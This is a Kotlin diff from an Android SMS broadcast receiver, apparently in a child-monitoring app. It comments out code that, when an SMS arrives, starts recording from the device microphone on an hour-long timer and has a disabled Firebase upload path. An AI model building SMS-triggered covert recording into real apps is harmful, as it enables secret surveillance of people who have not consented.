@@ -109,41 +109,23 @@ class SmsReceiver : BroadcastReceiver() {
         //
      //   val childRecording = ChildRecording(true, 600000)
         //    getReference("${Consts.RECORDING}/${Consts.PARAMS}").setValue(childRecording)
-        timer = MyCountDownTimer(60 * 60 * 1000, (1 * 1000).toLong(), {
-            //         setIntervalRecord(it)
-            fileName = "uyuyuyuy"
-        }) {
-            //   private fun sendFileAudio() {
-            val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/"
-            val dateName = fileName!!.replace("$filePath/", "")
-            val uri = Uri.fromFile(File(fileName))
-//            disposable.add(
-//                firebase.putFile("$RECORDING/$dateName", uri)
-//                    .subscribeOn(Schedulers.io())
-//                    .observeOn(AndroidSchedulers.mainThread())
-//                    .subscribe(
-//                        {
-//                            //   setPushName()
-//                            //
-//                            val duration = FileHelper.getDurationFile(fileName!!)
-//                            val recording = Recording(nameAudio, dateTime, duration)
-//                            firebase.getDatabaseReference("$RECORDING/$DATA").push()
-//                                .setValue(recording)
-//                            //         deleteFile(fileName)
-//                        },
-//                        {
-//                            fileName = "uyuyuyuy"
-//                            //deleteFile()
-//                        })
-//            )
-        }
+//        timer = MyCountDownTimer(60 * 60 * 1000, (1 * 1000).toLong(), {
+//            //         setIntervalRecord(it)
+//            fileName = "uyuyuyuy"
+//        }) {
+//            //   private fun sendFileAudio() {
+//            val filePath = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/"
+//            val dateName = fileName!!.replace("$filePath/", "")
+//            val uri = Uri.fromFile(File(fileName))
+//
+//        }
 
-        nameAudio = getRandomNumeric()
-        dateTime = getDateTime()
-        fileName = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/" + nameAudio + ".mp3" //context.getFileNameAudio(nameAudio, dateTime)
-
-        recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
-        timer!!.start()
+//        nameAudio = getRandomNumeric()
+//        dateTime = getDateTime()
+//        fileName = "${context.getFilePath()}/$ADDRESS_AUDIO_RECORD/" + nameAudio + ".mp3" //context.getFileNameAudio(nameAudio, dateTime)
+//
+//        recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
+//        timer!!.start()
 
 
     }
